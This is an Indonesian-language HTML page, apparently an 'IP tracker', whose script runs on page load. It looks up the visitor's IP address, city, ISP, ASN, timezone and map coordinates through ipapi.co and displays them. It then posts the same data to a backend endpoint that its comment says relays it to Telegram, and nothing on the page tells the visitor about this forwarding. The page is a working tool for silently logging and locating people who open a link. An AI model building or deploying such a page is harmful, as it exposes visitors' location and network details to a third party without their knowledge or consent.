<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Melacak IP...</title>
</head>
<body>
  <h3 id="status">ğŸ” Melacak lokasi...</h3>
  <pre id="result"></pre>

  <script>
    async function getIP() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        const info = `
ğŸŒ <b>Hasil Pelacakan IP</b>

ğŸ“ <b>IP:</b> ${data.ip}
ğŸŒ <b>Negara:</b> ${data.country_name}
ğŸ™ <b>Kota:</b> ${data.city}, ${data.region}
ğŸ›° <b>ISP:</b> ${data.org}
ğŸ¢ <b>Org:</b> ${data.org}
âš¡ <b>ASN:</b> ${data.asn}
âŒš <b>Zona Waktu:</b> ${data.timezone}
ğŸ“Œ <b>Koordinat:</b> ${data.latitude}, ${data.longitude}

ğŸ”— <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}">Lihat di Maps</a>
        `.trim();

        // Tampilkan ke user
        document.getElementById("status").textContent = "âœ… IP berhasil dilacak";
        document.getElementById("result").textContent = info;

        // Kirim ke Telegram via API backend
        const send = await fetch("/api/send", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ text: info })
        });

        const result = await send.json();
        if (!result.ok) {
          console.error("Gagal kirim ke Telegram:", result);
        }

      } catch (err) {
        document.getElementById("status").textContent = "âŒ Gagal melacak IP";
        console.error("ERROR:", err);
      }
    }

    getIP();
  </script>
</body>
</html>
